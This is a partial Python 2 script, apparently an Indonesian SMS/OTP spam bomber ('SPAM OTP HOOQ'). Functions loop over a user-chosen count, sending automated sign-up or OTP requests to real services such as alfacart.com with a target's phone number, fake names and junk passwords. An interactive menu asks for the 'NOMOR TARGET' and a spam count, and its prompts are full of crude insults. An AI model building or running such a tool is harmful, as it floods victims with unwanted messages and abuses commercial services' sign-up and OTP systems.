#!/usr/bin/python2
# Author : ./WANS X GANS-3XP
# Team : ANONYM05,PROGRAM JAVA) Exploiter Team ( BCA - X666X )
...
\____/| .__/ \__,_|_| |_| |_| \____/|_| |_| |_|___/
	...
	def Hooq(Phone, Amount):
		for _ in range(Amount):
			...
			if 'Your+number+has+been+blocked.' in submit.geturl():
				print(W+'NOMOR TARGET UDAH DI BLOKIR MAMPUS\n'+C+'SAMA PIHAK HOOQ. '+W+'COBA NOMOR LAIN ^_^')
				sys.exit() 
	...
	def AlfaMart(Phone, Amount):
		for _ in range(Amount):
			...
			data = {
			'fullName' : 'fb wans x gans',
			'red' : 'customer%2Faccount',
			'email' : 'CyberCringe@gmail.com',
			'password' : 'bacod kontodd',
			'isNewsletter' : 'on'
			}
			...
			postData = Sess.post('https://www.alfacart.com/getMemberInfo', data = {'email' : 'CYBER@gmail.com'})
	...
	def Phd(Phone, Amount):
		...
		for _ in range(Amount):
			...
			'requests_id' : '',
			'first_name' : 'FOLOW FB',
			'last_name' : ' WANS X GANS',
			'gender' : 'male',
			'phone_number' : Phone,
			'birthday' : '0000-00-00',
			'username' : 'CYBER@gmail.com',
			'password' : 'FOLOW 1000x Ya Anying',
			'agreeterms' : '1'
			}
	...
	def Spam():
		...
		Tik(C+50*'=')
		Tik(C+'['+W+'2'+C+']'+W+' SPAM OTP HOOQ'+W+'\tNGENTOD DULU'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		...
		if PilihTools == '1':
			try:
				...
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 1000 '+W+') : ')
				if Amount > 10:
					print
					print(W+'\tJANGAN BANYAK BANYAK ANJING KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
			...
			try:
				...
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 50 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tJANGAN BANYAK BANYAK ANJING KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
			...
			try:
				...
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 10 '+W+') : ')
				if Amount > 10:
					print
					print(W+'\tJANGAN BANYAK BANYAK ANJING KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
			...
			try:
				...
				Tik(C+'\t\t'+17*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 08xxxxxx '+W+') : ')
				...
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 9 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tUDAH LEWAT LIMIT ITU JUMLAHNYA ASUU'+C+'^_^')
					print
					sys.exit()
			...
			try:
				...
				print
				print(W+'HARUS ANGKA KONTOL'+M+' \xE2\x9C\x96')
				sys.exit()
			...
			os.system('xdg-open http://wa.me6283879699769?text=Hallo')
...
if __name__ == '__main__':
	print(C+'folow fb'+W+' Gua Dlu Ya Su !'+C+' :V')
	sleep(2)
	os.system('clear')
